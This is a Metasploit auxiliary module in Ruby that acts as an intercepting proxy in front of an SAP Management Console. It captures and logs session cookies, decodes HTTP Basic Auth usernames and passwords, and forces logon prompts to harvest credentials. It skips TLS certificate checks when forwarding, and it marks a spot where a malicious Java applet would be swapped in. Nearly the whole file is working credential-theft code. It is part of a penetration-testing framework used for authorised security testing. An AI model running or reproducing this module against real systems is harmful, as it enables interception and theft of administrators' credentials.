##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report


	def initialize
		super(
			'Name'        => 'SAP Management Console Capture: HTTP/HTTPS',
			'Version'     => '$Revision$',
			'Description'    => %q{
				This module acts as a proxy between the SAP Management Console and clients accessing it to capture credentials
			},
			'Author'      => [ 'Chris John Riley' ],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Capture' ]
				],
			'PassiveActions' =>
				[
					'Force'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptAddress.new('FWDHOST',[ true, "The address of the SAP Management Console", nil ]),
				OptPort.new('FWDPORT',[ true, "The port of the SAP Management Console", 50013 ]),
				OptBool.new('FWDSSL',[ true, "Use SSL for connections to the FWDHOST", true ]),
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 50013 ]),
			], self.class)
	end

	def run

		@myhost   = datastore['SRVHOST']
		@myport   = datastore['SRVPORT']
		@fwdhost   = datastore['FWDHOST']
		@fwdport   = datastore['FWDPORT']
		print_status("Listening for traffic on #{@myhost}:#{@myport} [SSL:#{datastore['SSL']}]")
		print_status("Forwarding all requests to #{@fwdhost}:#{@fwdport} [SSL:#{datastore['FWDSSL']}]")
		exploit()
	end

	def on_client_connect(c)
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end

	def on_client_data(cli)
		begin
			data = cli.get_once(-1, 5)
			raise ::Errno::ECONNABORTED if !data or data.length == 0
			case cli.request.parse(data)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_error("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end

		close_client(cli)
	end

	def close_client(cli)
		cli.close
		# Require to clean up the service properly
		raise ::EOFError
	end

	def dispatch_request(cli, req)

		phost = cli.peerhost
		ua = req['User-Agent']

		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]

		if (req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/)
			req.resource = $2
			hhead, nport = $1.split(":", 2)[0]
			@myport = nport || 80
		end

		cookies = req['Cookie'] || ''

		if(cookies.length > 0)
			report_note(
				:host => cli.peerhost,
				:type => "http_cookies",
				:data => hhead + " " + cookies,
				:update => :unique_data
			)
		end

		print_status("HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{ua} cookies=#{cookies}")

		if(req['Authorization'] and req['Authorization'] =~ /basic/i)
			basic,auth = req['Authorization'].split(/\s+/)
			user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
			report_auth_info(
				:host      => cli.peerhost,
				:port      => @myport,
				:sname     => 'http',
				:user      => user,
				:pass      => pass,
				:active    => true
			)

			report_note(
				:host     => cli.peerhost,
				:type     => "http_auth_extra",
				:data     => req.resource.to_s,
				:update => :unique_data
			)
			print_good("HTTP Basic Auth #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}")
		end


		if(req.resource =~ /\/sapmc\/(.*)/i) and !req['Authorization']
			print_good("Request to sapmc without Auth token seen - Forcing Logon through Basic Auth")

			res =
				"HTTP/1.1 401 Authorization Required\r\n" +
				"Host: #{hhead}\r\n" +
				"Content-Type: text/html\r\n" +
				"Content-Length: 4\r\n" +
				"WWW-Authenticate: Basic realm=\"SAP Management Console: Access Restricted\"" +
				"Connection: Close\r\n\r\n"

			cli.put(res)
			return
		end

		if(req.resource =~ /\/(.*).class$/i)
			print_good("Request to sapmc Java APPLET seen - Sending JAVA Exploit")

			# INSERT CODE HERE TO REPLACE ORIGINAL SAP JAVA APPLET WITH EXPLOIT

			res =
				"HTTP/1.1 200 OK\r\n" +
				"Host: #{hhead}\r\n" +
				"Content-Type: text/html\r\n" +
				"Content-Length: 4\r\n" +
				"Connection: Close\r\n\r\n" +
				"<html><h1>BOOM GOES THE DYNAMITE</h1><html>"

			cli.put(res)
			return
		end

		report_note(
			:host => cli.peerhost,
			:type => "http_request",
			:data => "#{hhead}:#{@myport} #{req.method} #{req.resource} #{ua}",
			:update => :unique_data
		)

		vprint_status("Request received: #{req.raw_uri}")
		vprint_status("Requesting resource from #{@fwdhost}:#{@fwdport}")

		http = Net::HTTP.new(@fwdhost, @fwdport)
		http.use_ssl = (datastore['FWDSSL'] == true)
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?

		if req.method == "GET"
			request = Net::HTTP::Get.new(req.raw_uri)
		else
			print_error("Non GET request")
		end

		request.add_field("Authorization", req['Authorization']) if req['Authorization']
		request.add_field("Cookie", req['Cookie']) if req['Cookie']
		request.add_field("Host", req['Host']) if req['Host']

		fwdreq = http.start {|http| http.request(request)}

		vprint_status("Received response #{fwdreq.code} #{fwdreq.msg} from #{@fwdhost}:#{@fwdport}")
		if not fwdreq
			print_error("#{@fwdhost}:#{@fwdport} Unable to connect to fwd host")
			return
		end

		data = fwdreq.body
		# Rewrite links to ensure they remain in the correct context (SSL or NOSSL)
		data = data.sub('<a HREF="http://', '<a HREF="https://') if datastore['SSL'] == true
		data = data.sub('<a HREF="https://', '<a HREF="http://') if datastore['SSL'] == false


		host = fwdreq['host'] ||= @fwdhost

		res  =
			"HTTP/#{fwdreq.http_version} #{fwdreq.code} #{fwdreq.msg}\r\n" +
			"Host: #{host}\r\n" +
			"Expires: 0\r\n" +
			"Cache-Control: must-revalidate\r\n" +
			"Content-Type: #{fwdreq['content-type']}\r\n" +
			"Content-Length: #{data.length}\r\n"

		if fwdreq.code == '302' || fwdreq.code == '301'
			# Rewrite location headers to ensure they remain in the correct context (SSL or NOSSL)
			res << "location: #{fwdreq['location'].sub('http://', 'https://')}\r\n" if datastore['SSL'] == true
			res << "location: #{fwdreq['location'].sub('https://', 'http://')}\r\n" if datastore['SSL'] == false
		end

		res << "server: #{fwdreq['server']}\r\n" if fwdreq['server'] != ''
		res << "www-authenticate: #{fwdreq['www-authenticate']}\r\n" if fwdreq.code == '401'
		res << "Connection: Close\r\n\r\n#{data}"

		cli.put(res)
		return

	end


end